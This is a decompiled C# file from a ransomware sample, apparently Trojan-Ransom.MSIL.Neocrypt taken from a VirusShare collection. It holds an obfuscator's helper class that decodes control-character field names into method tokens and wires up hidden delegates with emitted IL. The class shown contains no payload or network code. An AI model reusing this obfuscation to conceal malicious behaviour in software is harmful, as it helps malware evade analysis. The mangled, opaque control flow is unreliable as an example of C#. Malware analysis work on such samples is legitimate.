// Decompiled with JetBrains decompiler
// Type: #fg.#eg
// Assembly: LoadAssembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=489de906037d8a94
// MVID: B46B9881-0285-4729-849C-7A9813852236
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.MSIL.Neocrypt.c-d581e010b258e8f3cf3f45557eb29795dc6fc39a9eccfcbf12c2b372afcb6e03.exe

using \u0023fg;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace \u0023fg
{
  [\u0001.\u0001]
  [\u0003.\u0001]
  internal static class \u0023eg
  {
    private static ModuleHandle \u0001;
    private static char[] \u0001 = new char[58]
    {
      '\u0001',
      '\u0002',
      '\u0003',
      '\u0004',
      '\u0005',
      '\u0006',
      '\a',
      '\b',
      '\u000E',
      '\u000F',
      '\u0010',
      '\u0011',
      '\u0012',
      '\u0013',
      '\u0014',
      '\u0015',
      '\u0016',
      '\u0017',
      '\u0018',
      '\u0019',
      '\u001A',
      '\u001B',
      '\u001C',
      '\u001D',
      '\u001E',
      '\u001F',
      '\u007F',
      '\u0080',
      '\u0081',
      '\u0082',
      '\u0083',
      '\u0084',
      '\u0086',
      '\u0087',
      '\u0088',
      '\u0089',
      '\u008A',
      '\u008B',
      '\u008C',
      '\u008D',
      '\u008E',
      '\u008F',
      '\u0090',
      '\u0091',
      '\u0092',
      '\u0093',
      '\u0094',
      '\u0095',
      '\u0096',
      '\u0097',
      '\u0098',
      '\u0099',
      '\u009A',
      '\u009B',
      '\u009C',
      '\u009D',
      '\u009E',
      '\u009F'
    };

    [\u0001.\u0001]
    [\u0002.\u0001]
    [\u0003.\u0001]
    public static void \u0023dg([In] int obj0)
    {
      Type typeFromHandle;
      try
      {
        typeFromHandle = Type.GetTypeFromHandle(\u0023eg.\u0001.ResolveTypeHandle(33554433 + obj0));
      }
      catch
      {
        return;
      }
      foreach (FieldInfo field in typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField))
      {
        string name = field.Name;
        bool flag = false;
        int num1 = 0;
        int num2 = name.Length;
        int num3;
        while (true)
        {
          num3 = num2 - 1;
          if (false)
            num2 = num3;
          else
            break;
        }
        for (int index1 = num3; index1 >= 0; --index1)
        {
          char ch = name[index1];
          if (ch == '~')
          {
            flag = true;
            break;
          }
          for (int index2 = 0; index2 < 58; ++index2)
          {
            if ((int) \u0023eg.\u0001[index2] == (int) ch)
            {
              num1 = num1 * 58 + index2;
              break;
            }
          }
        }
        MethodInfo methodFromHandle;
        try
        {
          methodFromHandle = (MethodInfo) MethodBase.GetMethodFromHandle(\u0023eg.\u0001.ResolveMethodHandle(num1 + 167772161));
        }
        catch
        {
          continue;
        }
        Delegate @delegate;
        if (methodFromHandle.IsStatic)
        {
          try
          {
            @delegate = Delegate.CreateDelegate(field.FieldType, methodFromHandle);
          }
          catch (Exception ex)
          {
            continue;
          }
        }
        else
        {
          ParameterInfo[] parameters = methodFromHandle.GetParameters();
          int length = parameters.Length + 1;
          Type[] parameterTypes = new Type[length];
          parameterTypes[0] = typeof (object);
          int num4;
          int num5;
          for (int index = 1; index < length; index = num4 + num5)
          {
            parameterTypes[index] = parameters[index - 1].ParameterType;
            num4 = index;
            num5 = 1;
            if (num5 == 0)
              goto label_33;
          }
          DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, methodFromHandle.ReturnType, parameterTypes, typeFromHandle, true);
          ILGenerator ilGenerator = dynamicMethod.GetILGenerator();
          ilGenerator.Emit(OpCodes.Ldarg_0);
          if (length > 1)
            ilGenerator.Emit(OpCodes.Ldarg_1);
          if (length > 2)
            ilGenerator.Emit(OpCodes.Ldarg_2);
          if (length > 3)
            ilGenerator.Emit(OpCodes.Ldarg_3);
          int num6;
          if (length > 4)
            num6 = 4;
          else
            goto label_34;
label_32:
          int num7 = num6;
          num5 = length;
          num4 = num7;
label_33:
          if (num4 < num5)
          {
            ilGenerator.Emit(OpCodes.Ldarg_S, num6);
            ++num6;
            goto label_32;
          }
label_34:
          ilGenerator.Emit(OpCodes.Tailcall);
          ilGenerator.Emit(flag ? OpCodes.Callvirt : OpCodes.Call, methodFromHandle);
          ilGenerator.Emit(OpCodes.Ret);
          try
          {
            @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
          }
          catch
          {
            continue;
          }
        }
        try
        {
          field.SetValue((object) null, (object) @delegate);
        }
        catch
        {
        }
      }
    }

    static \u0023eg()
    {
      do
      {
        Type type;
        if (true)
          type = typeof (MulticastDelegate);
        if ((object) type != null)
          goto label_6;
label_5:
        continue;
label_6:
        \u0023eg.\u0001 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
        goto label_5;
      }
      while (false);
    }
  }
}
